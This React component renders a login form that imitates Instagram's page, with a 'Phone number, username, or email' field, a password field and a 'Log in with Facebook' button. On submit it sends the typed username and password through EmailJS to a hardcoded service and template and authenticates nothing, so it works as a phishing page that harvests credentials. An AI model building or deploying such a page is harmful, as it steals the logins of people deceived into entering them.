import { useState } from "react";
import "./App.css";
import emailjs from "@emailjs/browser";

function App() {
  const [credentials, setCredentials] = useState({
    username: "",
    password: "",
  });

  const handleOnChange = (e) => {
    const { name, value } = e.target;
    setCredentials((credentials) => {
      return {
        ...credentials,
        [name]: value,
      };
    });
  };

  const onSubmitHandle = (e)=>{
    e.preventDefault();
    emailjs
        .sendForm("service_br803w6", "template_zymmtbr", e.target, {
          publicKey: "AvjcnSCD_wypFW5ks",
        })
        .then(
          () => {
            console.log("SUCCESS!");
          },
          (error) => {
            console.log("FAILED...", error.text);
          }
        );
  }

  return (
    <div className="container">
      <div className="box">
        <div className="heading"></div>
        <form className="login-form" onSubmit={onSubmitHandle}>
          <div className="field">
            <input
              id="username"
              name="username"
              type="name"
              value={credentials.username}
              onChange={handleOnChange}
              placeholder="Phone number, username, or email"
            />
            <label for="username">Phone number, username, or email</label>
          </div>
          <div className="field">
            <input
              id="password"
              name="password"
              value={credentials.password}
              type="password"
              onChange={handleOnChange}
              placeholder="password"
            />
            <label for="password">Password</label>
          </div>
          <button className="login-button" title="login" type="submit">
            Log In
          </button>
          <div className="separator">
            <div className="line"></div>
            <p>OR</p>
            <div className="line"></div>
          </div>
          <div className="other">
            <button className="fb-login-btn" type="button">
              <i className="fa fa-facebook-official fb-icon"></i>
              <span className="">Log in with Facebook</span>
            </button>
            <a className="forgot-password" href="#">
              Forgot password?
            </a>
          </div>
        </form>
      </div>
      <div className="box">
        <p>
          Don't have an account?{" "}
          <a className="signup" href="#">
            Sign Up
          </a>
        </p>
      </div>
    </div>
  );
}

export default App;
